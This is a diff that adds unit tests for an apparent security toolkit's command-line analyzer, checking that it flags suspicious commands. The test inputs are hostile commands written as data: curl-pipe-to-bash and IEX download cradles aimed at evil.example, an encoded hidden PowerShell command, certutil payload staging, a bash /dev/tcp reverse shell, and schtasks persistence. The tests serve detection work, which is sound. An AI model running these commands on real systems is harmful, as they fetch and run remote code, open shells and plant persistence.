@@ -756,6 +756,90 @@ async function main() {
     assert.strictEqual(Object.keys(toolkit._enrichmentRemainder).length, 0, 'draining an empty remainder is a no-op');
   });
 
+  // ==================== Command Line Analyzer (real SOCToolkit rules) ====================
+  console.log('\n--- Command Line Analyzer Tests ---');
+
+  await test('cmdline: benign admin commands match nothing', () => {
+    for (const text of ['ipconfig /all', 'git status', 'dir C:\\Users', 'echo hello world']) {
+      const r = toolkit.analyzeCommandLine(text);
+      assert.strictEqual(r.matched.length, 0, `"${text}" should match no rules: ` +
+        r.matched.map((m) => m.id).join(','));
+      assert.strictEqual(r.verdict, 'clean');
+    }
+  });
+
+  await test('cmdline: encoded PowerShell is high risk', () => {
+    const r = toolkit.analyzeCommandLine('powershell -nop -w hidden -encodedcommand SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkA');
+    assert.ok(r.matched.some((m) => m.id === 'ps-encodedcommand'), 'encodedcommand rule must fire');
+    assert.ok(r.matched.some((m) => m.id === 'ps-stealth-flags'), 'stealth flags rule must fire');
+    assert.strictEqual(r.verdict, 'suspicious');
+  });
+
+  await test('cmdline: caret-split curl|bash is caught after normalization', () => {
+    const r = toolkit.analyzeCommandLine('c^u^r^l -s http://evil.example/x.sh | b^a^s^h');
+    assert.ok(r.matched.some((m) => m.id === 'curl-pipe-shell'), 'curl|bash must match through carets');
+    assert.ok(r.findings.some((f) => /caret/i.test(f.title)), 'caret obfuscation must be reported');
+    assert.strictEqual(r.verdict, 'malicious');
+  });
+
+  await test('cmdline: camelCase IEX download cradle is caught', () => {
+    const r = toolkit.analyzeCommandLine("iNvOkE-eXpReSsIoN (New-Object Net.WebClient).DownloadString('http://evil.example/a.ps1')");
+    assert.ok(r.matched.some((m) => m.id === 'ps-iex'), 'IEX must match case-insensitively');
+    assert.ok(r.matched.some((m) => m.id === 'webclient-download'), 'download cradle must match');
+    assert.ok(r.findings.some((f) => /mixed-case/i.test(f.title)), 'mixed-case spelling must be reported');
+    assert.strictEqual(r.verdict, 'malicious');
+  });
+
+  await test('cmdline: certutil staging from TEMP matches two rules', () => {
+    const r = toolkit.analyzeCommandLine('certutil -urlcache -f http://evil.example/p.exe %TEMP%\\p.exe');
+    assert.ok(r.matched.some((m) => m.id === 'certutil-fetch'));
+    assert.ok(r.matched.some((m) => m.id === 'exec-from-userdir'));
+    // One high + one medium stays below the high-risk bar: suspicious.
+    assert.strictEqual(r.verdict, 'suspicious');
+  });
+
+  await test('cmdline: bash reverse shell via /dev/tcp', () => {
+    const r = toolkit.analyzeCommandLine('bash -i >& /dev/tcp/10.0.0.1/4444 0>&1');
+    assert.ok(r.matched.some((m) => m.id === 'reverse-shell-tcp'));
+    assert.strictEqual(r.verdict, 'suspicious');
+  });
+
+  await test('cmdline: curl|bash is critical', () => {
+    const r = toolkit.analyzeCommandLine('curl -sSL https://get.evil.example/x | sudo bash');
+    assert.ok(r.matched.some((m) => m.id === 'curl-pipe-shell' && m.sev === 'critical'));
+    assert.strictEqual(r.verdict, 'malicious');
+  });
+
+  await test('cmdline: schtasks persistence from Public dir', () => {
+    const r = toolkit.analyzeCommandLine('schtasks /create /tn upd /tr C:\\Users\\Public\\u.exe /sc onlogon');
+    assert.ok(r.matched.some((m) => m.id === 'schtasks-create'));
+    // High + medium: suspicious, not high risk — a scheduled task alone can be admin work.
+    assert.strictEqual(r.verdict, 'suspicious');
+  });
+
+  await test('cmdline: single medium signal lands on review, not suspicious', () => {
+    const r = toolkit.analyzeCommandLine('klist purge');
+    assert.ok(r.matched.some((m) => m.id === 'kerberos-purge'));
+    assert.strictEqual(r.verdict, 'review', 'one medium hit is review-level');
+  });
+
+  await test('cmdline: looksLikeCommandLine gates the auto-offer', () => {
+    assert.strictEqual(toolkit.looksLikeCommandLine('powershell -command Get-Process'), true);
+    assert.strictEqual(toolkit.looksLikeCommandLine('curl http://evil.example/x | bash'), true);
+    assert.strictEqual(toolkit.looksLikeCommandLine('c^u^r^l -s http://x'), true);
+    assert.strictEqual(toolkit.looksLikeCommandLine('Contact admin@example.com about invoice 42'), false);
+    assert.strictEqual(toolkit.looksLikeCommandLine('short'), false);
+  });
+
+  await test('cmdline: plain -e flag is not an encoded PowerShell match', () => {
+    // 16+ base64 chars after the flag are required, so ordinary -e use stays clean.
+    const r = toolkit.analyzeCommandLine('curl -e https://referer.example http://example.com/file');
+    assert.ok(!r.matched.some((m) => m.id === 'ps-encodedcommand'),
+      'plain -e must not trigger the encodedcommand rule');
+  });
+
+  console.log(' [PASS] Command Line Analyzer');
+
   console.log('\nTest Summary:');
   console.log('  Passed:', passed);
   console.log('  Failed:', failed);
